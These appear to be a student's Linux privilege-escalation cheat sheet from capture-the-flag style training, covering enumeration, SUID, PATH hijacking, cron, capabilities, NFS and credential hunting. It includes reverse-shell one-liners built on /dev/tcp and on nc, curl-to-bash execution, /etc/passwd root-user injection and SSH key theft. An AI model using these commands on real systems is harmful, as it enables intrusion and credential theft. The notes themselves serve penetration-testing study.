
# General

#### Automated Tools

Linpeas: [https://github.com/carlospolslop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
Linux Exploit Suggester (LES): [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

`post/linux/gather/enum_configs`
- `enum_network`
- `enum_system`


#### Enumeration

- `Hostname` command will return name of target machine
- `Uname -a` will print system information
- `getuid`
	- `groups [user]`
	- `cat /etc/group`
- `df -h` prints storage devices mounted to the system
- `/proc/version` has info about kernel
- `/etc/issue` has info about operating system
- `/etc/passwd` can discover users or `/etc/shadow`
	- Use `cat /etc/passwd | cut -d ":" -f 1`
	- This command will only return the usernames and can be a nice brute-force list
	- Cat `/etc/passwd | grep home`
	- This one is helpful for any users that have their folders under the home directory
- `Sudo -l` lists commands that users can run
	- **If you see env_keep+=LD_PRELOAD** environment option, you can spawn a root shell with a simple C code. (in OneNote)
- `Id` command gives user privilege level and group memberships
- `History` command gives us earlier commands run on the system

- `Ps`for processes
	- `-A` view all
	- `Ps axjf` view process tree
	- `Ps aux` shows info for all users


Environment

- `Env` shows environment variables
	- PATH may have a compiler or scripting language that can be used to run code on the target system

- Netstat
	- `-a` for all listening ports and established connections
	- `-at` for TCP protocols
	- `-au` for UDP protocols
	- `-lt `for ports that are listening using TCP
	- `-tp` list connections and PID
	- Common usage is `netstat -ano`
		- `-a` for all ports and connections
		- `-n` for do not resolve names
		- `-o` display timers

# SUID/GUID

`rwsr-rwx-rwx` - SUID, executed with same permissions as file owner

`rwx-rws-rws` GUID, executed with same permissions as group permissions

Find all SUID/SGID bit sets on machine
	- `find / -type f -perm -04000 -ls 2>/dev/null`
	- Another example: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- USE GTFO BINS to see what you can do with any files or directories that have SUID or GUID, particularly executable files (/bin) (/usr/bin)


# FIND

`find . -name flag1.txt` : find the file named "flag1.txt" in current directory

`-find`
	`-name`
	`-perm a=x` finds executables
	`-user [user]` finds files for a certain user
	`-writeable -type d 2>/dev/null` find world-writeable folders
	`-perm -222 -type d 2>/dev/null` find world-writeable folders
	`-perm -o w -type d 2>/dev/null` find world-writeable folders
	`-type`
		`-d` is directory
		`-f` is file
		`-f perm 0777` find files with the 777 permissions
	-Other stuff:
		`find / -group [group] 2>/dev/null` to find binaries within a group that your user has permissions for
		`find / -writable -type d 2>/dev/null` find writeable folders (`writable` is spelled wrong here)
	Find all SUID/SGID bit sets on machine
		- `find / -type f -perm -04000 -ls 2>/dev/null`
		- Another example: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

# Shell Upgrade

Upgrade from shitty shell
`python3 -c 'import pty;pty.spawn ("/bin/bash")'`

from VIM
`vim -c ':!/bin/sh'`
or `:set shell=/bin/sh` and then `:shell` from inside vim

With some kind of application command execution (SQL, etc)
`bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
	set up a listened with port 443
		Then continue with python one above
		won't work if shell dies too quickly

# File Transfers

### No Network Comms

`scp` if ssh is enabled

File Hash and Base64 encoding
- `md5sum id_rsa`
- `cat id_rsa | base64 -w 0;echo`
- Target: `echo -n '[string]' | base64 -d > id_rsa`
- check sum again


### Network Comms

`wget [link] -O [output]`
`curl [link] -o [output]` 
additionally, instead of supplying an out file, you can execute files by piping directly into `python3` or `bash` 

`python3 -m uploadserver` or `http.server`

`php -S [IP:port]`

Impacket smbserver
`smbserver.py`
	- `impacket-smbserver -smb2support CompData [directory for server location]`
	- `CompData` is the name that the target will use to refer to the share.
	- To transfer from target (windows example): `move [file] \\[host-IP]\CompData`


### File Transfers with Code

Python
- `python3 -c 'import urllib.request;urllib.request.urlretrieve("[URL to file]", "[output]")'`

PHP
- `php -r '$file = file_get_contents("[file URL]"); file_put_contents("[output]",$file);'`


# Cron jobs

- Cron jobs are binaries or scripts set to run at a certain time
- They run with the privilege of their owners, not the current user
- `Cat /etc/crontab`
- Check File Permissions of the cronjob folders
	- `/etc/crontab`
	- `/etc/cron.d`
	- `/var/spool/cron/crontabs/root`
- PATH environment variable
- Wild Cards
	- View the contents of the other cronjob script - `cat /usr/local/bin/compress.sh`
	- If something is being run with a wildcard it will have *

# PATH Variable

PATH is an environment variable in Linux that tells the operating system where to search for a executables. If you try to run a program that does not have a standard binary path or isn't built into the shell, Linux uses the PATH variable to search for the executable.

- `Echo $PATH`
- Questions to answer before trying to exploit PATH:
	- What folders are in PATH?
	- Do you have any write privileges for them?
	- Can you modify $PATH?
- Search for writeable folders:
	- `Find / -writable 2>/dev/null`
	- Another example that might help clean up the results:
	- `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

- Add something to PATH:
	- `Export PATH=/tmp:$PATH` (adds /tmp to path)
	- This will help add the directory that our script is in
	- You want to add a writeable directory to path
	- for example, an executable with SUID bitset is running the `cat` command. Add a file `/tmp/cat` and put it in the PATH variable. Now your new file will run with those privileges. (set chmod for new file)

- You can write a script that searches for your fake binary [https://i.imgur.com/qX7m2Jq.png](https://i.imgur.com/qX7m2Jq.png)
	- When you find a writeable folder, write your script in it. (compile it if you need to).
	- Your binary will do something like `cat flag.txt`
	- Add the directory that these things are in to PATH
	- Set file permissions chmod `+x [fake binary]`
	- Run your script

# Capabilities

Capabilities are a method that administrators can use to increase privilege level of a process or binary.

`Get-cap` to list enabled capabilities
	- `Get-cap -r / 2>/dev/null`  will redirect error messages to /dev/null (there will be a lot of error messages)
	- This will return all files with capabilities, view GTFO bins for further exploitation


# Weak File Permissions

If a writeable executable, try this one-liner (it's a bash shell connect)
	 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [port] >/tmp/f'`


`Etc/shadow`
- Contains password hashes
- May be readable or writeable
- Use` ls -l` to view the bitset
- If you can read, copy password hashes and crack them.
- If you can write, replace a hash with one you created (goes between first and second colons)

`Etc/passwd`
- Contains info about user accounts
- Some versions of linux may still have password hashes stored here
- Readable - gather info
- Writeable - replace hashes
- Writeable - add a user with root privileges
	- You'll need to use something like `openssl passwd -1 -salt THM password1` to create a password hash and add it to the file
	- This gives the hash the salt from THM and the hashed password is password1
	- You still need to add a username at the beginning of the line in the `/passwd` file
	- After the hash, add `:0:0:root:/root:/bin/bash` to get root privileges for the new user's shell


# Passwords and Keys

History Files
- If a user has ever typed their password on the command line instead of the password prompt, it may have been recorded
- View contents of all hidden history files in user's home directory
	- `cat ~/.*history | less`

Config files
- Config files may contain passwords in plaintext or reversible formats.
- In this example it was an .ovpn file. It contained a reference to another location where credentials can be found.

Ssh keys
- found in `/home/user/.ssh/id_rsa`
- or `/root/.ssh/id_rsa`
	- try to make a public key and add it here
- Sometimes users make backups of important files but don't secure them with correct permissions
- Look for hidden files and directories in the system root - `ls -la /`
- Search hidden directories - `ls -l /[hidden directory]`
- Copy keys that you find to your attacking machine. Don't forget to give it the correct permissions.


# NFS

Shared folders with certain privilege level
Find a root SSH private key on the target machine and connect with SSH to get root privilege shell

NFS config: `/etc/exports`
- If `no_root_squash` is enabled , you can create an executable with SUID bit set

Process (done in a root terminal)
- Enumerate mountable shares from YOUR machine: showmount -e [target IP]
- Create a place to mount the share
	- `Mkdir /tmp/target_share`
- Mount the share to that place
	- `Mount -o rw [target_ip]:/[share_name] /tmp/target_share`
	- This mounts the share to the place we created, target_share

- Navigate to mounted share location, create executable
	- [https://i.imgur.com/nWKpFkK.png](https://i.imgur.com/nWKpFkK.png)
	- Compile and add -w option to gcc, set +s SUID bit
- Should be present on the target machines copy of the share with appropriate permissions. Run executable